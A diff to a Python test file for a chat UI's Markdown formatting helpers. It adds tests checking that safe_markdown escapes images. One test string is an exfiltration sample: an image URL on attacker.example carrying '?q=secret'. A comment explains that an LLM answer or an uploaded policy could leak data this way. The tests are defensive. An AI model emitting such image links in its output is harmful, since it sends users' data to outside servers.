@@ -1,4 +1,11 @@
-from ui.formatting import badge, reingest_summary, section_text, source_label, upload_summary
+from ui.formatting import (
+    badge,
+    reingest_summary,
+    safe_markdown,
+    section_text,
+    source_label,
+    upload_summary,
+)
 
 LLM_ANSWER = {"mode": "llm", "model": "llama3.2:3b", "fallback_reason": None}
 
@@ -84,3 +91,19 @@ def test_reingest_summary_counts_each_status() -> None:
     ]
 
     assert reingest_summary(results) == "Re-ingested 3 policies: 2 unchanged, 1 removed."
+
+
+def test_safe_markdown_stops_images_loading_by_themselves() -> None:
+    # A browser fetches a Markdown image at once, so text from an uploaded policy or an
+    # LLM answer could send data to any server. A link needs a click instead.
+    text = "See ![chart](https://attacker.example/p.png?q=secret) and ![x][ref]."
+
+    assert safe_markdown(text) == (
+        "See \\![chart](https://attacker.example/p.png?q=secret) and \\![x][ref]."
+    )
+
+
+def test_safe_markdown_leaves_ordinary_text_alone() -> None:
+    text = "| Years | Days |\n|---|---|\n| 0-2 | 14 |\n\n> Quoted! [1]"
+
+    assert safe_markdown(text) == text
